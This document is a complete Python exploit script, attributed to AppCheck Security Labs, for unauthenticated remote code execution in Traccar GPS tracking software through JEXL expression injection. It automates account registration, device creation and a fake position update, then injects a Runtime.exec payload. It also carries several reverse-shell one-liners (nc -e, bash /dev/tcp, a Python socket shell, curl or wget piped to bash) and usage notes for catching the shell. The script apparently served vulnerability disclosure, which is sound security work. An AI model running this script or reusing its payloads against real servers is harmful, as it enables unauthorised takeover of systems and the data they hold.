DEETZ = """[ Traccar JEXL Expression Unauthenticated RCE Exploit
[ Discovered: AppCheck Security Labs: 8/10/2018
[ Software: https://www.traccar.org/
[ Affected versions: <= 4.0 (current)
[ Discovery/Author: Nick Blundell (AppCheck NG)
[ AC: AC-2018-10-8-1
[ CVE: TBC
"""

# Usage:
'''
$ pip install click requests
$ python scripts/traccar_exploit.py exploit --url https://foo.com/traccar/ --check
[Prep for your shell: e.g. nc -lvp 443]
$ python scripts/traccar_exploit.py exploit --url https://foo.com/traccar/ --reverse-shell 1.2.3.4:443 
'''

import os
import pprint
import urlparse
import sys
import socket
import time

import click
import requests
from requests.packages import urllib3

# Oh, shut up!
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

e = click.echo
p = pprint.pformat
VERBOSE = os.environ.get("LOG_LEVEL", None)

class Exploit(object) :
    
    PASSWORD = "appch3ck$!$"
    DEVICE = "v_dev1"
    POSITION_UPDATE = "[3G*{device_id}*0083*UD,050218,060013,A,43.720963,N,123.2604950,E,0.00,244.2,0.0,19,40,56,0,0,00000000,2,255,460,0,18264,22511,125,18264,22512,115,0,3.4]"
    
    SHELL_1 = "nc -nv {shell_host} {shell_port} -e /bin/bash"
    SHELL_2 = """python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{shell_host}\",{shell_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" """
    SHELL_3 = 'bash -c "bash -i >& /dev/tcp/{shell_host}/{shell_port} 0>&1"'
    SHELL_4 = 'bash -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {shell_host} {shell_port} >/tmp/f"'
    SHELL_5 = 'bash -c "bash <(curl http://foobar.com/poc/shells/rev_shell77.111.219.203_443)"'
    SHELL_6 = 'bash -c "wget -O - http://foobar.com/poc/shells/rev_shell77.111.219.203_443 | bash"'
    SHELL = SHELL_1

    #SHELL = "wget -O /tmp/rshell http://foo.com/poc/shells/rev_shell77.111.219.203_443"
    #SHELL = "bash /tmp/rshell"
    # Note, you may need to try a few different shells to make this work on a given machine

    PAYLOAD = "''.class.class.forName('java.lang.Runtime').getRuntime().exec('{}')".format(SHELL)
    DEFAULT_EMAIL = "acrce10@foobardoodah.com"


    def __init__(self, url, watch_port, user_email, reverse_shell, check) :
        
        self._url = url
        self._watch_port = watch_port
        self._password = self.PASSWORD
        self._user_email = user_email
        self._username = self._user_email.split("@")[0]
        
        if reverse_shell :
            self._shell_host = reverse_shell.split(":")[0]
            self._shell_port = int(reverse_shell.split(":")[1])
        else :
            self._shell_host = None
            self._shell_port = None
            
        d("Created: {} (watch_port: {})".format(url, watch_port))

        self._host = urlparse.urlparse(self._url)[1].split(":")[0]

        s = self._session = requests.Session()
        s.verify = False
        if VERBOSE :
            s.hooks = dict(response=_dump_http)

        self._get_version()

        # Try to login, else try to register our account
        try :
            self._login(user_email, self._password)
        except :
            self._register()
            self._login(user_email, self._password)

        good("Logged in as: {}".format(user_email))

        # Just tie the device name to the user. Useful for testing.
        self._device = "{}_{}".format(self._username, self.DEVICE)

        self._create_device(self._device)

        self._ensure_device_has_position()
        
        info("Checking computed attribute expressions are executing")
        result = self._run_expression("'monk'+'ey'")
        assert("monkey" in result)
        good("Expression executed: exploitation looks viable")
        if check :
            return

        self._exploit()

    def _get_version(self) :
        info("Getting server version")
        response = self._send("get", "api/server")
        assert(response.status_code == 200)
        self._version = response.json()
        good("Server version: {}".format(self._version["version"]))



    def _exploit(self) :
        payload = self.PAYLOAD.format(
            shell_host = self._shell_host,
            shell_port = self._shell_port,
        )
        self._run_expression(payload)
        good("BOOM: You should have a nice shell")


    
    def _run_expression(self, expression) :
        # {"id":-1,"description":"test","type":"string","attribute":"raw","expression":"''.class.class.forName('java.lang.Runtime').getRuntime().exec('nc -nv 77.111.219.203 443 -e /bin/bash')"}
        response = self._send("post", "api/attributes/computed/test?deviceId={}".format(self._device_entry["id"]), json=dict(
            id=-1,
            description = "test",
            type = "string",
            attribute = "raw",
            expression = expression,
        ))
        assert(response.status_code == 200)
        return response.text


    def _bail(self, s) :
        bad(s)
        sys.exit(1)

    def _ensure_device_has_position(self) :
        info("Sending device position update as prerequisite for exploit")
        try:
            sock = socket.create_connection((self._host, self._watch_port), timeout=5)
        except:
            self._bail("Could not connect to device handler on {}:{}".format(self._host, self._watch_port))
        good("Connected to device protocol handler on {}:{}".format(self._host, self._watch_port))

        info("Sending GPS position update")
        message = self.POSITION_UPDATE.format(device_id = self._device_entry["uniqueId"])
        sock.sendall(message)
        # Give it some time to be processed
        time.sleep(3)



    def _get_device(self, device_name) :
        response = self._send("get", "api/devices")
        assert(response.status_code == 200)
        for entry in response.json() :
            if entry["name"] == device_name :
                return entry

        raise Exception("No device found")
 

    def _create_device(self, device_name) :
        # First check if device exists
        try :
            self._device_entry = self._get_device(device_name)
            good("Device exists already: {}".format(device_name))
            return
        except :
            pass
       

        response = self._send("post", "api/devices", json=dict(
            id=-1, groupId=0, disabled=False,
            name = device_name,
            uniqueId = device_name,
        ))
        assert(response.status_code == 200)
        self._device_entry = self._get_device(device_name)
        good("Created device: {}".format(device_name))



    def _register(self) :
        info("Registering new account: {}".format(self._user_email))
        response = self._send("post", "api/users", json=dict(
            email=self._user_email,
            password=self._password,
            name = self._username,
        ))
        assert(response.status_code == 200)
        good("Registered new account: {}".format(self._user_email))

    def _login(self, email, password) :
        response = self._send("post", "api/session", data=dict(
            email=email,
            password=password,
            undefined="true",
        ))
        if response.status_code != 200 :
            raise Exception("Login failed")

    def _send(self, method, uri, *args, **kargs) :
        url = urlparse.urljoin(self._url, uri)
        response = self._session.request(method, url, *args, **kargs)
        return response


@click.group()
def cli() :
    pass


@click.command()
@click.option('--watch-port', default=5093, help='Watch GPS protocol port.  Any protocol will so, just this exploit crafts one for Watch')
@click.option('--url', help='e.g. https://foo.com/traccar/', required=True)
@click.option('--reverse-shell', help='e.g. host:port')
@click.option('--user-email', default=Exploit.DEFAULT_EMAIL, help='Set an email for the user account', required=True)
@click.option('--check', is_flag=True, help='Check if looks vulnerable without running exploit')
def exploit(watch_port, url, reverse_shell, user_email, check) :
    info("Target: {} (watch port: {})".format(url, watch_port))
    sploit = Exploit(
        url = url,
        reverse_shell = reverse_shell,
        user_email = user_email,
        watch_port = watch_port,
        check = check,
    )


cli.add_command(exploit)


def main() :
    d("Started")
    print("".join([BANNER, DEETZ]))
    cli()

def d(s) :
    if not VERBOSE :
        return
    e(s)

def good(s) : e("[+] {}".format(s))
def info(s) : e("[i] {}".format(s))
def bad(s)  : e("[-] {}".format(s))

def _dump_http(res, *args, **kw):
    """dump HTTP request and response"""
    # request spec
    method = res.request.method
    url = res.url
    d('> %s %s' % (method, url))

    # request headers
    for k, v in res.request.headers.items():
        d('> %s: %s' % (k, v))

    # reqeuest body
    body = res.request.body
    if body:
        d(body)
    d('')

    # response code
    d('< %s %s' % (res.status_code, res.reason))

    # response headers
    for k, v in res.headers.items():
        d('< %s: %s' % (k, v))

    # response body
    d(res.text)
    d('')

BANNER = r"""
[    _                 ___ _               _    
[   /_\  _ __  _ __   / __\ |__   ___  ___| | __
[  //_\\| '_ \| '_ \ / /  | '_ \ / _ \/ __| |/ /
[ /  _  \ |_) | |_) / /___| | | |  __/ (__|   < 
[ \_/ \_/ .__/| .__/\____/|_| |_|\___|\___|_|\_\ 
[       |_|   |_|         AppCheck Ltd 2012-2018                      
[
[
"""




if __name__ == "__main__" :
    main()